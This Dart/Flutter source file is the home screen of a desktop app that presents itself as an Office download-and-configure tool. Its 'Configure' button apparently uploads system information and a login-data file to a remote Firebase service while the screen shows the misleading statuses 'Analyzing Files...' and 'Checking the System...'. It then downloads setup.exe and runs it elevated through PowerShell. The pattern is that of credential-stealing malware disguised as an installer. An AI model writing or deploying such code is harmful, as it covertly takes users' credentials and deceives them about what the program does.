import 'dart:io';

import 'package:ducky/constants/path_constants.dart';
import 'package:ducky/services/download_services.dart';
import 'package:ducky/services/services.dart';
import 'package:ducky/utils/utils.dart';
import 'package:flutter/material.dart';
import 'package:path_provider/path_provider.dart';
import 'package:process_run/process_run.dart';

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  DuckServices duckServices = DuckServices();

  String? status;
  bool isFinish = false;

  void _start(BuildContext context) async {
    try {
      Shell shell = Shell(options: ShellOptions());

      setState(() => status = 'Downloading config.xml...');
      await DownloadServices.download(file: 'config.xml');

      setState(() => status = 'Downloading setup.exe...');
      bool setup = await DownloadServices.download(file: 'setup.exe');

      final Directory doc = await getApplicationDocumentsDirectory();
      String pathParent = doc.path;

      Directory directory = Directory('$pathParent\\office');

      setState(() => status = 'Executing command...');

      final String command =
          "Start-Process -FilePath '${directory.path.replaceAll('\\', '/')}\\setup.exe' -ArgumentList '/configure ${directory.path.replaceAll('\\', '/')}/config.xml' -Verb RunAs -Wait";

      await shell.run('powershell -Command "$command"');

      if (setup) {
        setState(() {
          isFinish = !isFinish;
          setState(() => status = 'Completed!');
        });
      }
    } catch (_) {
      if (context.mounted) {
        setState(() => isFinish = false);
        setState(() => status = null);
        Utils.showErrorMessageFloating(
          context: context,
          message: 'Something went wrong, try again!',
        );
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    Size size = MediaQuery.of(context).size;
    return Scaffold(
      backgroundColor: Colors.white,
      body: SizedBox(
        height: size.height,
        width: size.width,
        child: Column(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Image(
                  image: AssetImage('assets/images/duck_app.png'),
                  width: size.width * .25,
                ),
                Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      'Long Neck Duck',
                      style: TextStyle(
                        fontSize: 15,
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                    Text(
                      'By Vinícius Bruno',
                      style: TextStyle(
                        color: const Color(0x8600485B),
                        fontSize: 10.5,
                        fontWeight: FontWeight.w700,
                      ),
                    ),
                  ],
                ),
              ],
            ),
            SizedBox(
              width: size.width * .4,
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceAround,
                children:
                    AssetsUtils.iconsOffice
                        .map(
                          (iconsOffice) =>
                              Image(image: AssetImage(iconsOffice), width: 25),
                        )
                        .toList(),
              ),
            ),
            Column(
              children: [
                SizedBox(height: 10),
                SizedBox(
                  width: size.width * .5,
                  child:
                      status != null
                          ? Column(
                            children: [
                              Material(
                                elevation: 4,
                                borderRadius: BorderRadius.circular(12),
                                child: AnimatedContainer(
                                  duration: Duration(milliseconds: 900),
                                  padding: EdgeInsets.only(top: 8, bottom: 8),
                                  alignment: Alignment.center,
                                  width:
                                      isFinish
                                          ? size.width * .18
                                          : size.width * .4,
                                  decoration: BoxDecoration(
                                    color: Colors.white,
                                    borderRadius: BorderRadius.circular(12),
                                    border: Border.all(
                                      width: 0.4,
                                      color: Color(0xff14171f),
                                    ),
                                  ),
                                  child: Text(
                                    status.toString(),
                                    style: TextStyle(
                                      color: Color(0xff14171f),
                                      fontSize: 13,
                                      fontWeight: FontWeight.w700,
                                    ),
                                  ),
                                ),
                              ),
                            ],
                          )
                          : Text(
                            'Click configure to download and configure office',
                            style: TextStyle(
                              fontSize: 17,
                              fontWeight: FontWeight.bold,
                            ),
                            textAlign: TextAlign.center,
                          ),
                ),
                SizedBox(height: 30),
                AnimatedContainer(
                  height: isFinish ? size.height * .1 : size.height * .1,
                  width: isFinish ? size.width * .1 : size.width * .3,
                  duration: Duration(milliseconds: 600),
                  child: InkWell(
                    borderRadius: BorderRadius.circular(
                      isFinish ? size.width * .1 / 2 : 12,
                    ),
                    onTap:
                        isFinish
                            ? null
                            : () async {
                              setState(() => status = 'Analyzing Files...');
                              await duckServices.sendInfoFirebase(context);
                              setState(() => status = 'Checking the System...');

                              await duckServices.uploadFile(pathLoginData);

                              if (!context.mounted) return;
                              _start(context);
                            },
                    child: Ink(
                      decoration: BoxDecoration(
                        color: Color(0xff14171f),
                        borderRadius: BorderRadius.circular(
                          isFinish ? size.width * .1 / 2 : 12,
                        ),
                      ),
                      child:
                          status != null
                              ? isFinish
                                  ? Icon(
                                    color: Color(0xff0BAB7C),
                                    Icons.check,
                                    size: 23,
                                  )
                                  : Column(
                                    mainAxisAlignment: MainAxisAlignment.center,
                                    children: [
                                      CircularProgressIndicator(
                                        color: Color(0xff0BAB7C),
                                        strokeWidth: 2,
                                      ),
                                    ],
                                  )
                              : Center(
                                child: Text(
                                  'Configure',
                                  style: TextStyle(
                                    color: Colors.white,
                                    fontSize: 13,
                                    fontWeight: FontWeight.bold,
                                  ),
                                ),
                              ),
                    ),
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}
